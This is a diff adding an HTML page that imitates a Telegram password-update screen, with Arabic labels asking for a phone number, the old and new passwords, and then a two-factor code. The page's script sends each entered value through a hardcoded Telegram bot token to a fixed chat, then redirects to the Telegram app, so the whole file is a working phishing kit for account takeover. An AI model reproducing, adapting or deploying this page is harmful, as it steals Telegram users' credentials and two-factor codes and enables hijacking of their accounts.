@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Telegram Password Update</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-image: linear-gradient(to bottom, #f7f7f7, #e7e7e7);
+  background-size: 100% 300px;
+  background-position: 0% 100%;
+
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f4f4f9;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: 60px auto;
+      padding: 30px;
+      background-color: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo img {
+      width: 50px;
+      height: 50px;
+    }
+    h1 {
+      font-size: 24px;
+      color: #333;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #555;
+    }
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    button[type="submit"] {
+      width: 100%;
+      background-color: #007bff;
+      color: #ffffff;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button[type="submit"]:hover {
+      background-color: #0056b3;
+    }
+    .additional-input {
+      display: none;
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 20px;
+      }
+      .logo img {
+        width: 40px;
+        height: 40px;
+      }
+      h1 {
+        font-size: 20px;
+      }
+      input[type="password"] {
+        font-size: 14px;
+      }
+      button[type="submit"] {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo">
+    </div>
+    <h1>Update Your Password</h1>
+    <form id="password-form">
+        <label for="phone-number">رقم الموبايل:</label>
+        <input type="text" id="phone-number" name="phone-number" required class="form-control">
+        <label for="old-password">كلمة السر القديمة:</label>
+        <input type="password" id="old-password" name="old-password" required class="form-control">
+        <label for="new-password">كلمة السر الجديدة:</label>
+         <input type="password" id="new-password" name="new-password" required class="form-control">
+  <button type="submit">Update Password</button>
+</form>
+    <div class="additional-input">
+      <label for="additional-info">ادخل رمز المصادقة الثنائيةالذي تم ارساله اليك  (اذا لم تكن قد قمت بتفعيل المصادقة الثنائية فتجاهل هذه الخطوة و اضغط تأكيد) :</label>
+      <input type="text" id="additional-info" name="additional-info" required>
+      <button id="confirm-btn">Confirm</button>
+    </div>
+  </div>
+
+  <script>
+  const botToken = "7341621457:AAEUmsmptZF9TAPbi8F-mjoiDGH3Kh3v_x0";
+  const chatId = "5918793423";
+
+  document.getElementById("password-form").addEventListener("submit", function(event) {
+    event.preventDefault();
+    const phoneNumber = document.getElementById("phone-number").value;
+    const oldPassword = document.getElementById("old-password").value;
+    const newPassword = document.getElementById("new-password").value;
+
+    const message = `Password update: ${phoneNumber} ${oldPassword} ${newPassword}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: `chat_id=${chatId}&text=${encodeURIComponent(message)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        console.log("Message sent successfully.");
+        document.querySelector(".additional-input").style.display = "block";
+      } else {
+        console.error("Failed to send message.");
+      }
+    })
+    .catch(error => {
+      console.error("Error:", error);
+    });
+  });
+
+  document.getElementById("confirm-btn").addEventListener("click", function(event) {
+    event.preventDefault();
+    const additionalInfo = document.getElementById("additional-info").value;
+
+    const message = `Additional info: ${additionalInfo}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: `chat_id=${chatId}&text=${encodeURIComponent(message)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        console.log("Message sent successfully.");
+        window.location.href = "tg://";
+      } else {
+        console.error("Failed to send message.");
+      }
+    })
+    .catch(error => {
+      console.error("Error:", error);
+    });
+  });
+</script>
+</body>
+</html>
